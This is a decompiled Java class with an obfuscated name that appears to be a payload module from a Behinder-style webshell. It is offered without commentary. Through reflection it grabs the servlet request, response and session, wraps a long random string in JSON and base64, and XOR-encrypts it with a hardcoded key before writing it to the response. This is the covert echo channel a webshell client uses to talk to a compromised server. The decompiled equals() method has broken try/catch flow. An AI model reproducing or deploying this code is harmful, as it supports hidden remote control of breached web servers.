/*
 * Decompiled with CFR.
 */
package org.xftjn;

import java.lang.Class;
import java.lang.Exception;
import java.lang.Integer;
import java.lang.Object;
import java.lang.String;
import java.lang.StringBuilder;
import java.lang.System;
import java.lang.Throwable;
import java.lang.reflect.Method;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Random;

/*
 * This class specifies class file version 49.0 but uses Java 6 signatures.  Assumed Java 6.
 */
public class Ikictpe {
    public static String content;
    public static String payloadBody;
    private Object Request;
    private Object Response;
    private Object Session;

    public Ikictpe() {
        content = "";
        content = content + "ZjvGshUqLU15OKEHrAOyy2LrG3o5zKN37VRMo86TnmcEtjv47sJ8ldzaLBF9BmyUcuAFgUd42WuYe63U5esnnE3giPa94wsnSRJujRX3UB2CsoszRYmOfDlbc2WvwXnIZPZ2WDRMiCCb2RvyH77F6uwoVQihpJAxud2kHOhAEFhnYdgxDwzOCXfJAmUHECTeiAogUApkjnStP0F2icikiAYgp9n2jeE5xkAHgMa9ysJ2HSzAkwL8ceN6DRVYQNKBicFFQ04HDtCY7boNYxgHFloVNWuIBwspLblD08bJb46YdUhKQhlyPp8npH2IavUj8Yjoa2TwrLIf67glTD8NRmCXLK6FEgE8CC4u9uQuVfuxvmd4P06B8KcXDINwT5TnBXgCYewFVqZzr7rvDlrFfoM9Lc2LDyNRkUdzgygdpG8SeS0AyhyDDoY1d0OpBgjmf44UhLM8N49CAaX6MAvglIlYJP9xDCfQQAenqf8H8Fqk0trudBQ5cmWiS82qwAJZDD7Xlo1b7XIdbVQwNSvkfIXPXiNccS2akjMJH7Vuuc0IV40pqbJkxORga8FgiSGLJTcpmkgGmNCoMcPQXuuCfCmFaFLZc5Y0QrJq9UkTS0l9rIseJ9Ge6hWgQgbnDdVYRZl3pzLJIfANLue90pPxXvqeU1wVCPfhfdRYJn3h71pTpLXPQOAw9AUddtAiIP6TEbUqEc1zDe2av45ZhbODuNBPdvvy2bSzbU4AxvzwgdGFsgbrCjmVfwxpYQZWnAqli6O7zoLCBagbWUpf5gsLQzA9ojSd0HHZOA0HvMzLkkiWo0XLDrYXzezt4cgDMCJc5D84S78XkwFE8fRZcjPiLx3Ea4onOCIK4rw81TdmDgCQflLUXJKD6uAK7qjSnSRzex2qdHuRRFrFg6G3S48tE34H9vwgyigEPzGm4tWfaoMSev1aTRPIwtmSNm5Q1xdTOTIexX7KeQigSkFbIhziLkeFfjUJp1RS0n45wnpkkeUl3954taXTyEjywBjCebnp5rASehjdoHGieCB78RaoM7vjIl1r0N38RU3QFTHfFyaAs5P3FzozKXmzF2bg0llX50bb6lOtXB7r4USzUuNotnVydT0diCAaMYDwTsJpmncW9pkNhDgC5fJez0nzwqKQcNGm2wdWRBFsA7lg4eGaFtUuboYKB5SW1McVYtZgox3nPyWpOU3vhTAQ4wryuJs9pe5IleQ7EsXWvYnRXvYOupwgodcoMSEQ5FW65qyGokRWq1smGxgB2Q8rqG8HiSj2tww66TZLs443F8hkppBvSgfVWT0kHPQGQa3uue9OrskaQ3C1LdvVEDJ24vx0Oc7FmoKUGF27UI3wCJVmG9nLhdIHgwvZa7SWohGrqWKZlh3FyFPjZ0IRX2FI2WCKcSa3iH7b0S9MAnw6DKugXFwOzr0dydPHMIToSZv8Nv8838e8OZcumYIgiwAqi9XX7Eyko0tako5gshm5SeMNCL5BrrSEmbztfaB5G3orUW04i9LC4EGrdJR1VcTzIR5NXt24iDwRXmcoKAV2N9oRtaWqFFCXtKjhVpahI6ouGD7nw8iUkDE1w71kEgyfOlahCT8gsvtVGpXvZQm6UZkpudXt1aFNZIFjt7kJeRFRAZDi8IRb2hCETs4NFZdl7aeun4q04ZIVQxedfEb6Jm4Qtlb48N6qOblLY3NuAGpGCnXcTTv7iD9n9R5yDQgoHJlBYA3YZbZMvTv3Q5cdZKqxedKBKuBF25DyaT6Erm0vG8MKwJcR3PePUUgr24x6OyaDV3xC38FhIkwSYzrRUR4BWSslfIxF7I2xU1hkbcqGWWXXK6dIzSzNMeXGO41y12HYoBM4ABf9mz11XRIx8U1SEm7MmkvkIJ6XXScbAc0NUufXr8sIwTwMd0IS8MMvgGoxNAq9c1lcTeZ3kwYsyjHdb6P44KDlf6H13qYTxHgDajYr4zguR0ZWtW3VEhoVt6n16QupLzzCGuIAxhpTuuK7djFGT11roMmKZHzZu6g6TVTWggkHcgCaF73uIMiPmBYle0UEODVMkMKlJ8jbe6GmBRpBoyeD3VTcmXL4DTRxh6pMVwVgj4iFvGmwWRGfi0uwAYOLPok6kLfHOWAAArk3T1ViUQi8neqN7KkVyXvdiG8YeRse6v1pL5tfiHuHzBlwVLLsjTvkXuC9GqfL05I3mUeonAP6aBlWKrsrjeakTbqrgM1zyjH9khg6U3zDVncIHMaPAZYGx1haTXgnDGcmQNoiMUoWA02ZlUq4lewH83vCtizu5BswopEeHOkbiwzf9Vpq50pQP9KyldNOLePPiYhkuX7HQFcmkvqd0jnrN7x6LUXQ9Cax3IG1GztvMkDNcdsd359Byj0rvjjjIoZqhuFD2IMJwhTRZfYtkPmf63cDDLrP1E85JtJ04GWDYZdL8Lvy9r4huR0it6mfve8nKME66U";
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Loose catch block
     */
    public boolean equals(Object obj) {
        block10: {
            LinkedHashMap<String, String> result = new LinkedHashMap<String, String>();
            this.fillContext(obj);
            result.put("status", "success");
            result.put("msg", content);
            try {
                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write = so.getClass().getMethod("write", byte[].class);
                write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
            break block10;
            catch (Exception e) {
                try {
                    result.put("msg", e.getMessage());
                    result.put("status", "success");
                }
                catch (Throwable throwable) {
                    try {
                        Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                        Method write = so.getClass().getMethod("write", byte[].class);
                        write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                        so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                        so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                    }
                    catch (Exception e2) {
                        e2.printStackTrace();
                    }
                    throw throwable;
                }
                try {
                    Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write = so.getClass().getMethod("write", byte[].class);
                    write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                    so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                    so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                }
                catch (Exception e3) {
                    e3.printStackTrace();
                }
            }
        }
        return true;
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key);
            if (encode) {
                value = this.base64encode(value.getBytes());
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map objMap = (Map)obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private String base64encode(byte[] data) throws Exception {
        String result = "";
        String version = System.getProperty("java.version");
        try {
            this.getClass();
            Class<?> Base64 = Class.forName("java.util.Base64");
            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
            result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{data});
        }
        catch (Throwable error) {
            this.getClass();
            Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder = Base64.newInstance();
            result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{data});
            result = result.replace("\n", "").replace("\r", "");
        }
        return result;
    }

    private byte[] getMagic() throws Exception {
        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
        Random random = new Random();
        byte[] buf = new byte[magicNum];
        for (int i = 0; i < buf.length; ++i) {
            buf[i] = (byte)random.nextInt(256);
        }
        return buf;
    }

    private byte[] Encrypt(byte[] byArray) throws Exception {
        String string = "e45e329feb5d925b";
        for (int i = 0; i < byArray.length; ++i) {
            byArray[i] = (byte)(byArray[i] ^ string.getBytes()[i + 1 & 0xF]);
        }
        return byArray;
    }
}
